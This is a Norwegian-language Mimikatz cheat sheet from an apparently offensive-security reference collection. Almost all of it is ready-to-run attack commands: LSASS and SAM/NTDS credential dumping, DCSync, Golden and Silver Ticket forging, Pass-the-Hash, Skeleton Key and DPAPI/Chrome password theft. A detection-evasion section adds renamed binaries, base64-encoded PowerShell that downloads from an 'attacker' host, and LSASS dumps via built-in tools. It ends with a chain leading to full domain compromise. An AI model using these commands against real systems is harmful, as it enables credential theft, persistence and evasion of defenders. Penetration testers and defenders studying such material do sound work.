# 🔑 Mimikatz – komplett hurtigreferanse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
> **Presisering:** Tilgjengelige påloggingsopplysninger avhenger av Windows-versjon, autentiseringsmetode og vern som Credential Guard; administratorrettigheter garanterer ikke uthenting av beskyttede hemmeligheter. Se [Microsofts beskrivelse](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/). DCSync krever relevante replikeringsrettigheter og er ikke en generell omgåelse av Credential Guard. Et feilsvar fra sekurlsa alene bekrefter heller ikke at Credential Guard er aktivert. I billett-eksemplene er RID 500 en kontoverdi (Administrator), mens 512 identifiserer gruppen Domain Admins; de er ikke begge gruppe-RID-er. SID-er, hashverdier og forutsetninger er illustrative. NTLM er passordavledede hasher, Kerberos bruker billetter, og DPAPI beskytter bruker- og systemhemmeligheter.


```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Uthenting av Windows-påloggingsopplysninger
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Påloggingsopplysninger">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 Et kraftig verktøy for uthenting av påloggingsopplysninger i Windows</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Hva er Mimikatz](#-hva-er-mimikatz)
- [Komme i gang](#-komme-i-gang)
- [Kjøringsmetoder](#-kjøringsmetoder)
- [Kjernemoduler](#-kjernemoduler)
- [Uthenting av påloggingsopplysninger](#-uthenting-av-påloggingsopplysninger)
- [Kerberos-angrep](#-kerberos-angrep)
- [Avanserte angrep](#-avanserte-angrep)
- [Teknikker for å unngå deteksjon](#-teknikker-for-å-unngå-deteksjon)
- [Hurtigreferanse](#-hurtigreferanse)

---

## 🎯 Hva er Mimikatz

**Mimikatz** er et verktøy for arbeid etter utnyttelse, laget av **Benjamin Delpy** (@gentilkiwi). Det kan hente ut:

- 🔑 **Passord i klartekst** fra Windows-minne (LSASS)
- 🎫 **Kerberos-billetter** (TGT, TGS)
- 🔐 **NTLM-hasher** fra SAM/NTDS
- 📜 **Sertifikater** og private nøkler
- 🗝️ **Mellomlagrede påloggingsopplysninger**
- 🔒 **DPAPI-hemmeligheter**

### Hvorfor er dette viktig?

| Bruksområde | Beskrivelse |
|----------|-------------|
| **Tyveri av påloggingsopplysninger** | Hent ut passord fra minnet |
| **Lateral bevegelse** | Pass-the-Hash, Pass-the-Ticket |
| **Rettighetseskalering** | Utgi seg for å være brukere |
| **Vedvarende tilgang** | Golden/Silver Tickets |
| **Kontroll over domenet** | DCSync for full kompromittering av AD |

---

## 🚀 Komme i gang

### Nedlasting

```bash
# Offisielt repo
git clone https://github.com/gentilkiwi/mimikatz.git

# Ferdigkompilerte binærfiler (utgivelser)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Krav

- **Administrator-/SYSTEM-rettigheter** (de fleste funksjoner)
- **SeDebugPrivilege** (for tilgang til LSASS)
- Windows x64 eller x86

### Første kommandoer

```cmd
# Start mimikatz
mimikatz.exe

# Kontroller rettigheter
mimikatz # privilege::debug
Privilege '20' OK

# Aktiver alle rettigheter
mimikatz # token::elevate

# Avslutt
mimikatz # exit
```

---

## 💻 Kjøringsmetoder

### 1. Selvstendig binærfil

```cmd
# Direkte kjøring (oppdages av antivirus)
mimikatz.exe

# Kommando på én linje
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Logg utdata til fil
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Med log-kommandoen
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Last ned og kjør i minnet (fileless)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Hent ut påloggingsopplysninger
Invoke-Mimikatz -DumpCreds

# Hent ut sertifikater
Invoke-Mimikatz -DumpCerts

# Kjør på en ekstern maskin
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi)

```bash
# I en Meterpreter-økt
meterpreter > load kiwi

# Hent hjelp
meterpreter > help kiwi

# Hent ut alle påloggingsopplysninger
meterpreter > creds_all

# Hent ut hasher
meterpreter > lsa_dump_sam

# Hent ut hemmeligheter
meterpreter > lsa_dump_secrets

# Kerberos-billetter
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# Hent ut SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Hent ut LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Hent ut NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. Fra en minnedump

```cmd
# Hent ut LSASS-minne med Oppgavebehandling eller procdump
procdump.exe -ma lsass.exe lsass.dmp

# Last inn minnedumpen i mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 🔧 Kjernemoduler

### Moduloversikt

| Modul | Beskrivelse |
|--------|-------------|
| **sekurlsa** | Hent ut påloggingsopplysninger fra LSASS-minne |
| **lsadump** | Hent ut SAM, NTDS, hemmeligheter og mellomlager |
| **kerberos** | Manipulering av Kerberos-billetter |
| **crypto** | CryptoAPI-sertifikater |
| **vault** | Windows Vault (administrasjon av påloggingsopplysninger) |
| **token** | Manipulering av tokener |
| **privilege** | Manipulering av rettigheter |
| **process** | Prosessmanipulering |
| **service** | Tjenestemanipulering |
| **dpapi** | DPAPI-hemmeligheter |
| **misc** | Diverse kommandoer |

### Hente hjelp

```cmd
# List alle moduler
mimikatz # ::

# Modulhjelp
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

## 🔐 Uthenting av påloggingsopplysninger

### sekurlsa-modulen (LSASS)

```cmd
# Aktiver debug-rettigheten først!
mimikatz # privilege::debug

# Hent ut alle påloggingspassord (klartekst, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Hent bare ut NTLM-hasher
mimikatz # sekurlsa::msv

# Hent ut Kerberos-billetter
mimikatz # sekurlsa::tickets

# Hent ut WDigest-opplysninger (klartekst hvis aktivert)
mimikatz # sekurlsa::wdigest

# Hent ut Kerberos-krypteringsnøkler
mimikatz # sekurlsa::ekeys

# Hent ut DPAPI-påloggingsopplysninger
mimikatz # sekurlsa::dpapi

# Hent ut påloggingsopplysninger for en bestemt prosess
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Hent ut TsPkg-påloggingsopplysninger (RDP)
mimikatz # sekurlsa::tspkg

# Hent ut LiveSSP-påloggingsopplysninger
mimikatz # sekurlsa::livessp

# Hent ut SSP-påloggingsopplysninger
mimikatz # sekurlsa::ssp

# Hent ut CloudAP-påloggingsopplysninger (Azure AD)
mimikatz # sekurlsa::cloudap
```

### lsadump-modulen (SAM/NTDS)

```cmd
# Hent ut SAM-databasen (lokale kontoer)
mimikatz # lsadump::sam

# Hent ut SAM med SYSTEM-hiven
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Hent ut LSA-hemmeligheter
mimikatz # lsadump::secrets

# Hent ut mellomlagrede påloggingsopplysninger (DCC2)
mimikatz # lsadump::cache

# DCSync (replikering fra domenekontroller)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Hent ut NTDS.dit (domenekontroller)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Hent ut tillitsnøkler
mimikatz # lsadump::trust /patch

# Hent ut sikkerhetskopinøkler (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### vault-modulen (Credential Manager)

```cmd
# List Vault-påloggingsopplysninger
mimikatz # vault::list

# Hent ut Vault-påloggingsopplysninger
mimikatz # vault::cred /patch
```

### dpapi-modulen

```cmd
# Hent ut DPAPI-hovednøkler
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Dekrypter en DPAPI-blob
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Chrome-passord
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 🎫 Kerberos-angrep

### Vise billetter

```cmd
# List alle billetter
mimikatz # kerberos::list

# List billetter med detaljer
mimikatz # kerberos::list /export

# Eksporter alle billetter
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT)

```cmd
# Fjern eksisterende billetter
mimikatz # kerberos::purge

# Importer billett
mimikatz # kerberos::ptt ticket.kirbi

# Kontroller billett
mimikatz # kerberos::list
```

### Golden Ticket (vedvarende domeneadministratortilgang)

```cmd
# Krav:
# - Domenenavn (domain.local)
# - Domene-SID (S-1-5-21-...)
# - NTLM-hash for krbtgt
# - Brukernavn for målet (kan være oppdiktet ifølge originalen)

# Opprett Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Opprett og eksporter
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Med bestemte grupper (RID 500 = Admin, 512 = Domain Admins osv.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# Med angitt domenekontroller
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket (tjenestespesifikk)

```cmd
# Krav:
# - Domenenavn
# - Domene-SID
# - NTLM-hash for målets tjenestekonto
# - Tjenestens SPN

# Opprett Silver Ticket for CIFS (fildelinger)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket til HTTP (web)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket til SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket til WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

## 💀 Avanserte angrep

### Pass-the-Hash (PtH)

```cmd
# Kjør kommando som bruker ved hjelp av NTLM-hash
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Med AES-nøkler
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# PtH for å starte en prosess
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash (Pass-the-Key)

```cmd
# Konverter NTLM til en Kerberos-billett
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Be deretter om TGT
# klist skal vise Kerberos-billetten
```

### DCSync-angrep

```cmd
# Repliker én bruker
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Repliker krbtgt (for Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Repliker alle brukere
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Repliker fra en bestemt domenekontroller
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Skeleton Key

```cmd
# Injiser skeleton key i domenekontrollerens LSASS (alle brukere kan autentisere med "mimikatz")
mimikatz # misc::skeleton

# Vedvarende tilgang frem til domenekontrolleren starter på nytt
# Logg inn med en hvilken som helst bruker: passord = mimikatz
```

### Misbruk av DPAPI

```cmd
# Hent ut hovednøkler
mimikatz # sekurlsa::dpapi

# Dekrypter fil med påloggingsopplysninger
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Lagrede RDP-passord
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Tokenmanipulering

```cmd
# List tokener
mimikatz # token::list

# Eskaler til SYSTEM
mimikatz # token::elevate

# Eskaler til en bestemt bruker
mimikatz # token::elevate /user:Administrator

# Gå tilbake til det opprinnelige tokenet
mimikatz # token::revert

# Kjør som en bestemt bruker
mimikatz # token::run /user:domain\admin
```

---

<a id="-teknikker-for-å-unngå-deteksjon"></a>
## 🛡️ Teknikker for å unngå deteksjon

### Tilslørte navn

```cmd
# Gi mimikatz.exe nytt navn
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### Tilsløring av PowerShell

```powershell
# Base64-kod
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Kjøring bare i minnet

```powershell
# Invoke-Mimikatz (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Eller bruk Meterpreters kiwi
meterpreter > load kiwi
meterpreter > creds_all
```

### Alternative LSASS-uttrekk

```cmd
# Procdump (signert av Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (innebygd)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Oppgavebehandling (grafisk grensesnitt)
# Høyreklikk lsass.exe > Create dump file

# SQLDumper (fra SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

### Omgåelse av Credential Guard

```cmd
# Kontroller om Credential Guard er aktivert
mimikatz # sekurlsa::logonpasswords
# Viser "ERROR kuhl_m_sekurlsa_acquireLSA"

# Alternativ: Bruk DCSync i stedet
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## 📊 Hurtigreferanse

### Viktige kommandoer på én linje

```cmd
# Hent ut alle påloggingsopplysninger
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Hent ut SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync for alle
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Hurtigreferanse for moduler

| Kommando | Beskrivelse |
|---------|-------------|
| `privilege::debug` | Aktiver debug-rettigheten |
| `token::elevate` | Eskaler til SYSTEM |
| `sekurlsa::logonpasswords` | Hent ut alle påloggingsopplysninger fra LSASS |
| `sekurlsa::msv` | Hent ut NTLM-hasher |
| `sekurlsa::tickets` | Hent ut Kerberos-billetter |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Hent ut SAM-databasen |
| `lsadump::secrets` | Hent ut LSA-hemmeligheter |
| `lsadump::dcsync` | DCSync-angrep |
| `lsadump::lsa /patch` | Hent ut NTDS fra domenekontrolleren |
| `kerberos::list` | List Kerberos-billetter |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Opprett Golden/Silver Ticket |
| `kerberos::purge` | Fjern billetter |
| `vault::list` | List Vault-påloggingsopplysninger |
| `dpapi::cred` | Dekrypter DPAPI-påloggingsopplysninger |

### Eksempel på angrepskjede

```
1. Skaff innledende tilgang
2. privilege::debug
3. sekurlsa::logonpasswords (hent påloggingsopplysninger)
4. sekurlsa::pth (lateral bevegelse)
5. lsadump::dcsync /user:krbtgt (hent krbtgt-hash)
6. kerberos::golden (opprett Golden Ticket)
7. Full kompromittering av domenet!
```

---

## 📚 Ressurser

- [Offisielt GitHub-repo](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz-wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecuritys Mimikatz-veiledning](https://adsecurity.org/?page_id=1821)
- [HackTricks om Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Relaterte hurtigreferanser
- [Rettighetseskalering i Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.nb.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.nb.md)

---

<p align="center">
  <b>🔑 Lær angrep mot Windows-påloggingsopplysninger!</b><br>
  <i>Mimikatz – en allsidig verktøykasse for Windows</i>
</p>
